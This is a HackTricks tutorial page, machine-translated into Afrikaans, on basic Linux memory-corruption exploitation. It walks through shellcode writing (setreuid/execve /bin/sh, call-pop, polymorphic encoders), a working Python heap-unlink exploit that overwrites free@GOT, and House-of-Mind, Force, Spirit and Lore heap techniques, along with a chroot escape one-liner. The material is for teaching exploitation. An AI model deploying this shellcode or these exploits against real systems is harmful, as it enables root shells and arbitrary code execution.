# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

Ver onderbrekings van die kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; skoonmaak eax\
xor ebx, ebx ; ebx = 0 want daar is geen argument om oor te dra\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Voer syscall uit

**nasm -f elf assembly.asm** ‚Äî> Dit gee ons 'n .o\
**ld assembly.o -o shellcodeout** ‚Äî> Dit gee ons 'n uitvoerbare vorm van die assemblerkode en ons kan die opcodes met **objdump** kry\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Om te sien dat dit werklik ons shellcode is en die OpCodes te kry

**Kontroleer dat die shellcode werk**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Om te sien dat die stelsels oproepe korrek uitgevoer word, moet die vorige program gekompileer word en die stelsels oproepe moet verskyn in **strace ./PROGRAMA\_COMPILADO**

Wanneer shellcodes geskep word, kan 'n truuk gedoen word. Die eerste instruksie is 'n jump na 'n call. Die call roep die oorspronklike kode aan en plaas ook die EIP op die stack. Na die call instruksie het ons die string wat ons benodig, ingevoeg, sodat ons met daardie EIP na die string kan verwys en ook die kode kan voortgaan uitvoer.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ met die Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Huter:**

Bestaan uit 'n klein kode wat die geheuebladsye geassosieer met 'n proses deursoek op soek na die shellcode wat daar gestoor is (soek 'n handtekening wat in die shellcode geplaas is). Nuttig in gevalle waar daar slegs 'n klein ruimte is om kode in te spuit.

**Shellcodes polim√≥rfies**

Bestaan uit gesleutelde shells wat 'n klein kode het wat hulle ontsleutel en na hulle spring, met die Call-Pop truuk, dit sou 'n **cesar gesleutelde voorbeeld** wees:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5.Aanvullende Metodes**

**Murat Tegniek**

In linux word alle programme gemap vanaf 0xbfffffff

Deur te kyk hoe die stapel van 'n nuwe proses in linux gebou word, kan 'n exploit ontwikkel word sodat die program in 'n omgewing begin word waarvan die enigste veranderlike die shellcode is. Die adres hiervan kan dan bereken word as: addr = 0xbfffffff - 4 - strlen(NAME\_full\_executable) - strlen(shellcode)

Op hierdie manier kan die adres waar die omgewing veranderlike met die shellcode is, eenvoudig verkry word.

Dit kan gedoen word omdat die funksie execle toelaat om 'n omgewing te skep wat slegs die gewenste omgewing veranderlikes bevat.

### **Formaat Strings na Buffer Oorloop**

Die **sprintf beweeg** 'n geformateerde string **na** 'n **veranderlike.** Daarom kan jy die **formatering** van 'n string misbruik om 'n **buffer oorloop in die veranderlike** te veroorsaak waar die inhoud na gekopieer word.\
Byvoorbeeld, die payload `%.44xAAAA` sal **44B+"AAAA" in die veranderlike skryf**, wat 'n buffer oorloop kan veroorsaak.

### **\_\_atexit Strukture**

{% hint style="danger" %}
Tans is dit baie **vreemd om dit te exploiteer**.
{% endhint %}

**`atexit()`** is 'n funksie waaraan **ander funksies as parameters oorgedra word.** Hierdie **funksies** sal **uitgevoer** word wanneer 'n **`exit()`** of die **terugkeer** van die **hoof** uitgevoer word.\
As jy die **adres** van enige van hierdie **funksies** kan **wysig** om na 'n shellcode te verwys, sal jy **beheer** oor die **proses** verkry, maar dit is tans meer ingewikkeld.\
Tans is die **adresse na die funksies** wat uitgevoer moet word **versteek** agter verskeie strukture en uiteindelik is die adres waarnatoe dit verwys nie die adresse van die funksies nie, maar is **ge√´nkripteer met XOR** en verskuiwings met 'n **willekeurige sleutel**. So tans is hierdie aanvalsvector **nie baie nuttig nie, ten minste op x86** en **x64\_86**.\
Die **enkripsiefunksie** is **`PTR_MANGLE`**. **Ander argitekture** soos m68k, mips32, mips64, aarch64, arm, hppa... **implementeer nie die enkripsie** funksie nie omdat dit **die selfde** teruggee as wat dit as invoer ontvang. So hierdie argitekture kan deur hierdie vektor aangeval word.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Tans is dit baie **vreemd om dit te exploiteer**.
{% endhint %}

**`Setjmp()`** laat toe om die **konteks** (die registers) te **stoor**\
**`longjmp()`** laat toe om die **konteks** te **herstel**.\
Die **gestoorde registers** is: `EBX, ESI, EDI, ESP, EIP, EBP`\
Wat gebeur is dat EIP en ESP deur die **`PTR_MANGLE`** funksie oorgedra word, so die **argitekture wat kwesbaar is vir hierdie aanval is dieselfde as hierbo**.\
Hulle is nuttig vir foutherstel of onderbrekings.\
Echter, volgens wat ek gelees het, is die ander registers nie beskerm nie, **so as daar 'n `call ebx`, `call esi` of `call edi`** binne die funksie wat aangeroep word, kan beheer oorgeneem word. Of jy kan ook EBP wysig om die ESP te wysig.

**VTable en VPTR in C++**

Elke klas het 'n **Vtable** wat 'n reeks van **wysers na metodes** is.

Elke objek van 'n **klas** het 'n **VPtr** wat 'n **wyser** na die reeks van sy klas is. Die VPtr is deel van die kop van elke objek, so as 'n **oorskrywing** van die **VPtr** bereik word, kan dit **gewysig** word om na 'n dummy metode te **wys** sodat die uitvoering van 'n funksie na die shellcode sal gaan.

## **Preventiewe Maatre√´ls en Ontduikings**

**Vervanging van Libsafe**

Word geaktiveer met: LD\_PRELOAD=/lib/libsafe.so.2\
of\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Dit onderskep oproepe na sommige onveilige funksies deur ander veilige. Dit is nie gestandaardiseer nie. (slegs vir x86, nie vir kompilasies met -fomit-frame-pointer, nie statiese kompilasies nie, nie alle kwesbare funksies word veilig nie en LD\_PRELOAD werk nie in bin√™re met suid).

**ASCII Gewapende Adres Ruimte**

Dit bestaan uit die laai van die gedeelde biblioteke van 0x00000000 tot 0x00ffffff sodat daar altyd 'n byte 0x00 is. Dit stop egter regtig nie enige aanval nie, en nog minder in little endian.

**ret2plt**

Dit bestaan uit die uitvoering van 'n ROP sodat die funksie strcpy@plt (van die plt) aangeroep word en na die ingang van die GOT gewys word en die eerste byte van die funksie wat aangeroep moet word (system()). Daarna word dieselfde gedoen deur na GOT+1 te wys en die 2de byte van system() te kopieer‚Ä¶ Uiteindelik word die adres wat in GOT gestoor is, aangeroep wat system() sal wees.

**Hokke met chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installeer 'n basiese stelsel onder 'n spesifieke subgids

'n Admin kan uit een van hierdie hokke kom deur: mkdir foo; chroot foo; cd ..

**Kodesinstrumentering**

Valgrind ‚Äî> Soek foute\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Oorloop: Basiese Exploits**

**Gekose stuk**

prev\_size |\
size | ‚ÄîKop\
\*mem | Data

**Vrye stuk**

prev\_size |\
size |\
\*fd | Ptr vorentoe stuk\
\*bk | Ptr agterstuk ‚ÄîKop\
\*mem | Data

Die vrye stukke is in 'n dubbelgekoppelde lys (bin) en daar kan nooit twee vrye stukke langs mekaar wees nie (hulle word saamgevoeg).

In ‚Äúsize‚Äù is daar bits om aan te dui: Of die vorige stuk in gebruik is, of die stuk deur mmap() toegeken is en of die stuk aan die prim√™re arena behoort.

As 'n stuk vrygestel word en een van die aangrensende vry is, word hulle saamgevoeg deur die makro unlink() en die nuwe groter stuk word aan frontlink() gegee om die toepaslike bin in te voeg.

unlink(){\
BK = P->bk; ‚Äî> Die BK van die nuwe stuk is die een wat die een wat al vry was, gehad het\
FD = P->fd; ‚Äî> Die FD van die nuwe stuk is die een wat die een wat al vry was, gehad het\
FD->bk = BK; ‚Äî> Die BK van die volgende stuk wys na die nuwe stuk\
BK->fd = FD; ‚Äî> Die FD van die vorige stuk wys na die nuwe stuk\
}

Daarom, as ons daarin slaag om die P->bk met die adres van 'n shellcode en die P->fd met die adres na 'n ingang in die GOT of DTORS minus 12 te wysig, word dit bereik:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

En so word die shellcode uitgevoer wanneer die program verlaat.

Boonop skryf die 4de stelling van unlink() iets en die shellcode moet hiervoor herstel wees:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Dit veroorsaak die skryf van 4 bytes vanaf die 8ste byte van die shellcode, so die eerste instruksie van die shellcode moet 'n jmp wees om dit oor te slaan en in 'n paar nops te val wat na die res van die shellcode lei.

Daarom word die exploit geskep:

In die buffer1 plaas ons die shellcode wat begin met 'n jmp sodat dit in die nops of in die res van die shellcode val.

Na die shellcode plaas ons opvulling totdat ons by die veld prev\_size en size van die volgende stuk kom. In hierdie plekke plaas ons 0xfffffff0 (sodat die prev\_size oorgeskryf word om die bit wat s√™ dat dit vry is, te h√™) en ‚Äú-4‚Äú(0xfffffffc) in die size (sodat wanneer dit in die 3de stuk nagaan of die 2de werklik vry was, dit na die gewysigde prev\_size gaan wat sal s√™ dat dit vry is) -> So wanneer free() ondersoek, sal dit na die size van die 3de gaan, maar werklik na die 2de - 4 en sal dink dat die 2de stuk vry is. En dan sal dit **unlink()** aanroep.

Wanneer unlink() aangeroep word, sal dit as P->fd die eerste data van die 2de stuk gebruik, sodat daar die adres wat oorgeskryf moet word - 12 (want in FD->bk sal dit 12 by die adres wat in FD gestoor is, optel). En in daardie adres sal dit die tweede adres wat in die 2de stuk gevind word, invoer, wat ons wil h√™ dat dit die adres na die shellcode moet wees (P->bk vals).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes van opvulling**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Dit is belangrik dat die bit wat aandui dat die vorige stuk vry is, op 1 is**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, sodat dit dink dat die ‚Äúsize‚Äù van die 3de stuk 4bytes agter is (wys na prev\_size) want dit is daar waar dit kyk of die 2de stuk vry is**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #In die payload sal ons aan die begin 8bytes opvulling plaas**

**got\_free = pack("\<I", 0x08048300 - 12) #Adres van free() in die plt-12 (dit sal die adres wees wat oorgeskryf word sodat die shellcode die 2de keer wat free aangeroep word, gelanseer word)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Soos ges√™ begin die payload met 8 bytes opvulling omdat dit is**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Die 2de stuk word gewysig, die got\_free wys na waar ons die adres addr\_sc + 12 gaan stoor**

**os.system("./8.3.o " + payload)**

**unset() wat in omgekeerde volgorde vrylaat (wargame)**

Ons beheer 3 opeenvolgende stukke en hulle word in omgekeerde volgorde vrygestel.

In daardie geval:

In die chunck c plaas ons die shellcode

Die chunck a gebruik ons om die b te oorskry sodat die size die bit PREV\_INUSE gedeaktiveer het sodat dit dink dat die chunck a vry is.

Boonop word die size in die kop b oorgeskryf sodat dit -4 is.

Dan sal die program dink dat ‚Äúa‚Äù vry is en in 'n bin, sodat dit unlink() sal aanroep om dit te ontkoppel. Maar, aangesien die kop PREV\_SIZE -4 is, sal dit dink dat die stuk ‚Äúa‚Äù werklik begin by b+4. Dit wil s√™, dit sal 'n unlink() na 'n stuk wat begin by b+4 doen, sodat daar in b+12 die ‚Äúfd‚Äù wysers sal wees en in b+16 die ‚Äúbk‚Äù wysers.

So, as ons in bk die adres na die shellcode plaas en in fd die adres na die funksie ‚Äúputs()‚Äù-12, het ons ons payload.

**Frontlink Tegniek**

Dit word frontlink genoem wanneer iets vrygestel word en geen van sy aangrensende stukke vry is nie, dit word nie unlink() genoem nie, maar direk frontlink().

Nuttige kwesbaarheid wanneer die malloc wat aangeval word, nooit vrygestel word (free()).

Dit benodig:

'n buffer wat oorloop kan word met die invoerfunksie

'n buffer wat aan hierdie buffer grens wat vrygestel moet word en waarvan die fd veld van sy kop gewysig sal word danksy die oorloop van die vorige buffer

'n buffer om vry te stel met 'n grootte groter as 512 maar kleiner as die vorige buffer

'n buffer wat voor stap 3 verklaar is wat toelaat om die prev\_size hiervan te oorskry

So, deur in twee mallocs ongekontroleerd en in een op 'n kontroleerde manier te oorskry, maar slegs daardie een vry te stel, kan ons 'n exploit maak.

**Double free() kwesbaarheid**

As free() twee keer met dieselfde wyser aangeroep word, bly daar twee bins wat na dieselfde adres wys.

In die geval dat een weer gebruik moet word, sal dit sonder probleme toegeken word. In die geval dat 'n ander gebruik moet word, sal dit dieselfde ruimte toegeken word, sodat ons die wysers ‚Äúfd‚Äù en ‚Äúbk‚Äù vals sal h√™ met die data wat die vorige toekenning sal skryf.

**Na free()**

'n Wyser wat voorheen vrygestel is, word weer sonder beheer gebruik.

## **8 Heap Oorloop: Gevorderde Exploits**

Die tegnieke van Unlink() en FrontLink() is verwyder deur die unlink() funksie te wysig.

**Die huis van die gedagtes**

Slegs 'n oproep na free() is nodig om die uitvoering van arbitr√™re kode te veroorsaak. Dit is belangrik om 'n tweede stuk te soek wat deur 'n vorige oorloop en vrygestel kan word.

'n Oproep na free() veroorsaak 'n oproep na public\_fREe(mem), dit doen:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Gee 'n wyser na die adres waar die stuk begin (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] kontroleer dit die size veld die bit NON\_MAIN\_ARENA, wat verander kan word sodat die kontrole waarneem dat dit waar is en heap\_for\_ptr() uitvoer wat 'n and op ‚Äúmem‚Äù doen wat die 2.5 minder belangrike bytes op 0 laat (in ons geval van 0x0804a000 laat dit 0x08000000) en toegang tot 0x08000000->ar\_ptr verkry (soos 'n struct heap\_info).

So, as ons 'n stuk kan beheer byvoorbeeld in 0x0804a000 en 'n stuk gaan vrystel in **0x081002a0** kan ons by die adres 0x08100000 kom en skryf wat ons wil, byvoorbeeld **0x0804a000**. Wanneer hierdie tweede stuk vrygestel word, sal dit ontdek dat heap\_for\_ptr(ptr)->ar\_ptr die waarde wat ons in 0x08100000 geskryf het, teruggee (want die and wat ons vroe√´r gesien het, word op 0x081002a0 toegepas en daaruit word die waarde van die eerste 4 bytes, die ar\_ptr, geneem).

So, dit roep \_int\_free(ar\_ptr, mem) aan, dit wil s√™, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Soos ons vroe√´r gesien het, kan ons die waarde van av beheer, want dit is wat ons in die stuk wat vrygestel gaan word, geskryf het.

Soos gedefinieer in unsorted\_chunks, weet ons dat:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Daarom, as ons in av->bins\[2] die waarde van \_\_DTOR\_END\_\_-12 skryf, sal die laaste instruksie in \_\_DTOR\_END\_\_ die adres van die tweede stuk skryf.

Dit wil s√™, in die eerste stuk moet ons aan die begin baie keer die adres van \_\_DTOR\_END\_\_-12 plaas, want daaruit sal av->bins\[2] dit neem.

In die adres waar die adres van die tweede stuk met die laaste 5 nulles val, moet ons die adres na hierdie eerste stuk skryf sodat heap\_for\_ptr() dink dat die ar\_ptr aan die begin van die eerste stuk is en daaruit die av->bins\[2] sal neem.

In die tweede stuk en danksy die eerste, oorskry ons die prev\_size met 'n jump 0x0c en die size met iets om -> NON\_MAIN\_ARENA te aktiveer.

Daarna plaas ons 'n klomp nops in die stuk 2 en uiteindelik die shellcode.

So sal \_int\_free(TROZO1, TROZO2) aangeroep word en die instruksies volg om die adres van die prev\_size van die TROZO2 in \_\_DTOR\_END\_\_ te skryf wat na die shellcode sal spring.

Om hierdie tegniek toe te pas, is daar 'n paar vereistes wat die payload 'n bietjie meer ingewikkeld maak.

Hierdie tegniek is nie meer toepaslik nie, aangesien 'n soortgelyke herstel toegepas is soos vir unlink. Dit vergelyk of die nuwe plek waarheen daar gewys word, ook na homself wys.

**Fastbin**

Dit is 'n variant van Die huis van die gedagtes.

Ons is ge√Ønteresseerd om die volgende kode uit te voer wat bereik word na die eerste kontrole van die funksie \_int\_free().

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Waar fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

So, as ons in ‚Äúfb‚Äù die adres van 'n funksie in die GOT plaas, sal daar in hierdie adres die adres na die oorgeskrywe stuk geplaas word. Hiervoor sal dit nodig wees dat die arena naby die adresse van dtors is. Meer presies dat av->max\_fast in die adres is wat ons gaan oorskry.

Aangesien ons met Die Huis van die Gedagtes gesien het dat ons die posisie van die av beheer.

As ons dan in die size veld 'n grootte van 8 + NON\_MAIN\_ARENA + PREV\_INUSE plaas ‚Äî> fastbin\_index() sal ons fastbins\[-1] teruggee, wat na av->max\_fast sal wys.

In hierdie geval sal av->max\_fast die adres wees wat oorgeskrywe sal word (nie na waar dit wys nie, maar daardie posisie sal oorgeskrywe word).

Boonop moet dit voldoen dat die stuk wat aan die vrygestelde groter moet wees as 8 -> Aangesien ons ges√™ het dat die size van die vrygestelde stuk 8 is, moet ons in hierdie vals stuk net 'n size groter as 8 plaas (soos die shellcode in die vrygestelde stuk sal wees, sal daar aan die begin 'n jmp wees wat in nops val).

Boonop moet daardie selfde vals stuk kleiner wees as av->system\_mem. av->system\_mem is 1848 bytes verder.

As gevolg van die nulles van \_DTOR\_END\_ en die min adresse in die GOT, is daar geen adres in hierdie afdelings wat oorgeskrywe kan word nie, so kom ons kyk hoe om fastbin toe te pas om die stapel aan te val.

'n Ander vorm van aanval is om die **av** na die stapel te herlei.

As ons die size wysig sodat dit 16 in plaas van 8 is, sal fastbin\_index() ons fastbins\[0] teruggee en kan ons dit gebruik om die stapel te oorskry.

Hiervoor mag daar geen canary of vreemde waardes in die stapel wees nie, ons moet eintlik in hierdie wees: 4 nulles + EBP + RET.

Die 4 nulles is nodig sodat die **av** aan hierdie adres sal wees en die eerste element van 'n **av** is die mutexe wat 0 moet wees.

Die **av->max\_fast** sal die EBP wees en sal 'n waarde wees wat ons sal help om die beperkings te oorkom.

In die **av->fastbins\[0]** sal met die adres van **p** oorgeskrywe word en dit sal die RET wees, sodat dit na die shellcode sal spring.

Boonop sal daar in **av->system\_mem** (1484bytes bo die posisie in die stapel) genoeg rommel wees wat ons sal toelaat om die kontrole wat gedoen word, te oorkom.

Boonop moet dit voldoen dat die stuk wat aan die vrygestelde groter moet wees as 8 -> Aangesien ons ges√™ het dat die size van die vrygestelde stuk 16 is, moet ons in hierdie vals stuk net 'n size groter as 8 plaas (soos die shellcode in die vrygestelde stuk sal wees, sal daar aan die begin 'n jmp wees wat in nops val wat na die size veld van die nuwe vals stuk gaan).

**Die Huis van Gees**

In hierdie geval soek ons om 'n wyser na 'n malloc te h√™ wat deur die aanvaller gewysig kan word (byvoorbeeld, dat die wyser onder 'n moontlike oorloop na 'n veranderlike in die stapel is).

So kan ons maak dat hierdie wyser na enige plek wys. Maar nie enige plek is geldig nie, die grootte van die vals stuk moet kleiner wees as av->max\_fast en meer spesifiek gelyk wees aan die grootte wat in 'n toekomstige oproep na malloc()+8 aangevra word. Daarom, as ons weet dat na hierdie kwesbare wyser malloc(40) aangeroep word, moet die grootte van die vals stuk gelyk wees aan 48.

As die program byvoorbeeld die gebruiker om 'n nommer vra, kan ons 48 invoer en die wyser van malloc wat gewysig kan word na die volgende 4bytes (wat met geluk aan die EBP kan behoort, so die 48 agterbly, soos die kop grootte). Boonop moet die adres ptr-4+48 aan verskeie voorwaardes voldoen (in hierdie geval ptr=EBP), dit wil s√™, 8 < ptr-4+48 < av->system\_mem.

As dit voldoen, wanneer die volgende malloc wat ons ges√™ het, malloc(40) is, sal dit as adres die adres van die EBP toegeken word. As die aanvaller ook kan beheer wat in hierdie malloc geskryf word, kan hy sowel die EBP as die EIP met die adres wat hy wil, oorskry.

Ek glo dit is omdat wanneer dit vrygestel word, free() sal onthou dat daar in die adres wat na die EBP van die stapel wys, 'n stuk van die perfekte grootte vir die nuwe malloc() wat aangevra word, is, so dit sal daardie adres toeken.

**Die Huis van Krag**

Dit is nodig:

* 'n oorloop na 'n stuk wat die wilderness kan oorskry
* 'n oproep na malloc() met die grootte wat deur die gebruiker gedefinieer is
* 'n oproep na malloc() waarvan die data deur die gebruiker gedefinieer kan word

Die eerste stap is om die size van die wilderness stuk met 'n baie groot waarde (0xffffffff) te oorskry, sodat enige geheue aanvraag wat groot genoeg is, in \_int\_malloc() behandel sal word sonder om die heap uit te brei.

Die tweede stap is om av->top te verander sodat dit na 'n geheuegebied onder die beheer van die aanvaller wys, soos die stapel. In av->top sal \&EIP - 8 geplaas word.

Ons moet av->top oorskry sodat dit na die geheuegebied onder die beheer van die aanvaller wys:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim neem die waarde van die adres van die huidige wilderness stuk (die huidige av->top) en remainder is presies die som van daardie adres plus die hoeveelheid bytes wat deur malloc() aangevra is. So as \&EIP-8 in 0xbffff224 is en av->top 0x080c2788 bevat, sal die hoeveelheid wat ons in die beheerde malloc moet reserveer sodat av->top na $EIP-8 wys vir die volgende malloc() wees:

0xbffff224 - 0x080c2788 = 3086207644.

So sal die veranderde waarde in av->top gestoor word en die volgende malloc sal na die EIP wys en dit kan oorskry.

Dit is belangrik om te weet dat die size van die nuwe wilderness stuk groter moet wees as die aanvraag wat deur die laaste malloc() gemaak is. Dit wil s√™, as die wilderness na \&EIP-8 wys, sal die size presies in die EBP veld van die stapel wees.

**Die Huis van Lore**

**Klein Bin Korruptie**

Die vrygestelde stukke word in die bin ingevoer op grond van hul grootte. Maar voordat hulle ingevoer word, word hulle in onsorted bins gestoor. 'n Stuk wat vrygestel word, word nie onmiddellik in sy bin geplaas nie, maar bly in onsorted bins. Daarna, as 'n nuwe stuk aangevra word en die vorige vrygestelde dit kan dien, word dit teruggegee, maar as 'n groter een aangevra word, word die vrygestelde stuk in onsorted bins in sy toepaslike bin geplaas.

Om by die kwesbare kode te kom, moet die geheue aanvraag groter wees as av->max\_fast (72 normaalweg) en kleiner as MIN\_LARGE\_SIZE (512).

As daar in die bins 'n stuk van die toepaslike grootte is wat aangevra word, word dit teruggegee nadat dit ontkoppel is:

bck = victim->bk; Wys na die vorige stuk, dit is die enigste info wat ons kan verander.

bin->bk = bck; Die voorlaaste stuk word die laaste, in die geval dat bck na die stapel wys, sal die volgende aangevraagde stuk hierdie adres ontvang.

bck->fd = bin; Die lys word gesluit sodat dit na bin wys.

Dit is nodig:

Dat daar twee mallocs aangevra word, sodat die eerste oorloop kan word nadat die tweede vrygestel en in sy bin ingevoer is (dit wil s√™, 'n groter malloc aangevra is voordat die oorloop gemaak word).

Dat die malloc wat aan die adres wat deur die aanvaller gekies is, toegeken word, deur die aanvaller beheer kan word.

Die doel is die volgende, as ons 'n oorloop na 'n heap kan maak wat onder 'n stuk wat reeds vrygestel is en in sy bin is, kan ons sy bk wyser verander. As ons sy bk wyser verander en hierdie stuk die eerste in die binlys word en 'n malloc aangevra word, sal bin mislei word en ges√™ word dat die laaste stuk van die lys (die volgende wat aangebied word) in die valse adres wat ons geplaas het (na die stapel of GOT byvoorbeeld) is. Sodat as daar weer 'n ander stuk aangevra word en die aanvaller toestemming het, sal 'n stuk in die gewenste posisie gegee word en kan daar in geskryf word.

Na die vrystelling van die gewysigde stuk is dit nodig om 'n stuk groter as die vrygestelde aan te vra, sodat die gewysigde stuk uit onsorted bins sal kom en in sy bin ingevoer sal word.

Sodra dit in sy bin is, is dit tyd om sy bk wyser deur die oorloop te verander sodat dit na die adres wat ons wil oorskry, wys.

So sal die bin moet wag totdat daar genoeg keer na malloc() aangeroep word sodat die gewysigde bin weer gebruik word en bin mislei word om te glo dat die volgende stuk in die valse adres is. En dan sal die stuk wat ons belangstel, gegee word.

Om die kwesbaarheid so gou as moontlik uit te voer, is dit ideaal: Reservasie van die kwesbare stuk, reservasie van die stuk wat gewysig sal word, vrystelling van hierdie stuk, reservasie van 'n groter stuk wat gewysig sal word, wysiging van die stuk (kwesbaarheid), reservasie van 'n stuk van gelyke grootte as die gewysigde en 'n tweede stuk van gelyke grootte wat na die gekose adres sal wys.

Om hierdie aanval te beskerm, is die tipiese kontrole gebruik dat die stuk ‚Äúnie‚Äù vals is nie: dit word nagegaan of bck->fd na victim wys. Dit wil s√™, in ons geval of die wyser fd\* van die vals stuk wat in die stapel gewys is, na victim wys. Om hierdie beskerming te oorkom, moet die aanvaller op een of ander manier (waarskynlik deur die stapel) in die toepaslike adres die adres van victim kan skryf. Sodat dit soos 'n werklike stuk lyk.

**Groot Bin Korruptie**

Die selfde vereistes as voorheen is nodig en nog 'n paar, boonop moet die vrygestelde stukke groter as 512 wees.

Die aanval is soos die vorige, dit wil s√™, die bk wyser moet gewysig word en al daardie oproepe na malloc() is nodig, maar daar moet ook die size van die gewysigde stuk gewysig word sodat daardie size - nb < MINSIZE.

Byvoorbeeld, dit sal maak dat die size 1552 is sodat 1552 - 1544 = 8 < MINSIZE (die aftrekking kan nie negatief wees nie omdat 'n unsigned vergelyking gemaak word).

Boonop is daar 'n herstel toegepas om dit nog moeiliker te maak.

**Heap Spraying**

